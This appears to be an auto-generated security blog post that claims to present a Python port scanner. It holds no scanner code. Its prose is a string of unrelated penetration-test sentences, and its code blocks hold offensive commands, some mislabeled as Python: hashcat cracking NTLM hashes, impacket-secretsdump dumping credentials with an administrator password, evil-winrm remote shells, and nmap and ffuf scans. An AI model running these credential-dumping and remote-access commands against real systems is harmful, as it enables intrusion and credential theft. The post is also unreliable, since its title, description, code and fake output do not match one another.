---
TitleSEO: "Automated Port Scanner in Python | ZureFX"
TitlePost: "Automated Port Scanner — Python"
Author: "ZureFX"
Description: "A Python script for automated port scanner. Built for security research and automation."
Keywords: "bash, automation, c, python"
URL: "https://zurefx.github.io/scripting/script-automated-port-scanner-898.html"
URL_IMAGES: ""
Date: "2024-10-21"
Tags: "Bash, Automation, C, Python"
Section: "scripting"
Lang: "en"
main_img: "script-automated-port-scanner-898"
Permalink: "/scripting/script-automated-port-scanner-898.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `GetUserSPNs`
- `impacket`
- `hashcat`

## Implementation

### Core Logic

The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions.

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Helper Functions

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.101.14.252
```

## Usage

### Basic Usage

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
nmap -sCV -p1433,3389,445 10.110.139.95 -oN scan.txt
evil-winrm -i 10.112.75.38 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.14.48.45/FUZZ
```

### Advanced Options

The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
evil-winrm -i 10.126.107.22 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.35.189.161
```

## Output

### Example Output

The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files.

```
[+] Scanning target...
[+] Found 18 results
[+] Done in 21.66s
```
